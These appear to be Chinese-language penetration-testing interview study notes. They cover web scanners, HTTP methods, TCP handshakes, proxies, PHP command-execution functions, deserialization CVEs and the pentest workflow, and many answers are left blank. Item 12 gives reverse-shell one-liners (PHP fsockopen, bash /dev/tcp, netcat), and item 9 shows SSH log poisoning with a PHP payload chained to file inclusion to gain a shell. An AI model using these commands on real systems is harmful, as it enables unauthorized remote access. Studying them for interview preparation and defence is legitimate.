linux 30%
windows 10%
渗透	原理 绕过思路 40%
开放性命题 20%

1. web扫描器的原理	
	Web漏洞扫描通常采用两种策略，第一种是被动式策略，第二种是主动式策略。所谓被动式策略就是基于主机之上，对系统中不合适的设置、脆弱的口令以及其他与安全规则抵触的对象进行检查;而主动式策略是基于网络的，它通过执行一些脚本文件模拟对系统进行攻击的行为并记录系统的反应，从而发现其中的漏 洞。利用被动式策略的扫描称为系统安全扫描，利用主动式的策略扫描称为网络安全扫描。
	

扫描过程 会使用什么形式进行扫描？
	head
	

2.  GET/POST 之外的请求有哪些？
	PUT HEAD DELETE CONNECT TRACE OPTIONS
	
3.  同源策略
	所谓的同源，指的是协议，域名，端口相同。

4. windows计划任务 
	schtasks at
linux 计划任务位置
		/var/spool/cron/*
		/var/spool/anacron/*
		/etc/crontab
		/etc/anacrontab
		/etc/cron.*
		/etc/anacrontab

5. ==tcp udp 区别==
	TCP是面向连接的，而UDP是面向非连接的，即发送数据前不需要建立连接。
	TCP提供可靠服务，而UDP无法保证可靠的数据传输。
	TCP面向字节流UDP面向报文
	TCP传输数据慢。UDP传输数据快。
tcp 三次握手
		三次握手过程
		建立TCP连接时，需要客户端和服务器共发送3个包。
		第一次：客户端发送初始序号x和syn=1请求标志
		第二次：服务器发送请求标志syn，发送确认标志ACK，发送自己的序号seq=y，发送客户端的确认序号ack=x+1
		第三次：客户端发送ACK确认号，发送自己的序号seq=x+1，发送对方的确认号ack=y+1

6. 正向代理和反向代理
	正向代理 是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。
	反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。

7. http的基础认证爆破
	bp 账号：密码	base64

8. php命令执行函数有哪些？
	eval/assert/preg_replace/create_function
	system/passthru/exec/shell_exec/popen/proc_open/pcntl_exec/dl/`xx`

9. 已知有文件包含漏洞和22端口，如何利用最后拿shell
	ssh '<?php phpinfo(); ?>'@IP
	然后文件包含登陆日志
	ssh日志默认是在/var/log/auth.log下，默认其它用户是有read的权限的。
	
10. linux被入侵之后 你该怎么做应急？
	
https://xz.aliyun.com/t/1140
	
11. webshell检测思路

    

12. 常用的反弹shell命令

    ```php
    php -r '$sock=fsockopen("192.168.11.101",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```

    ```bash
    bash -i >& /dev/tcp/192.168.20.151/8080 0>&1
    ```

    ```bash
    nc 192.168.31.151 7777 -t  /bin/bash
    ```

13. SQL注入写webshell

    

14. DNS在渗透中的作用
    子域名劫持  
    C2

15. 如何防治XXE漏洞产生？

    

16. XXE利用？

    

17. tomcat的加固

    https://www.cnblogs.com/panwenbin-logs/p/8177523.html

18. 如何防范ddos攻击	memcache放大	DNS放大 ntp放大

    

19. 常见中间件反序列化漏洞举例

    - fastjson 1.2.24 反序列化导致任意命令执行漏洞
    - JBoss JMXInvokerServlet 反序列化漏洞
    - JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）
    - Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）
    - Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）
    - Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）

20. CSRF、SSRF和重放攻击原理和区别

    

21. 渗透测试的流程*
    前期交互 -> 情报收集 -> 威胁建模 -> 漏洞分析 -> 漏洞攻击 -> 后渗透 -> 报告

22. xss绕过问题

    

23. DNS C2 溯源思路
    ipconfig /displaydns

24. 未授权访问漏洞的利用形式 （详细）

    
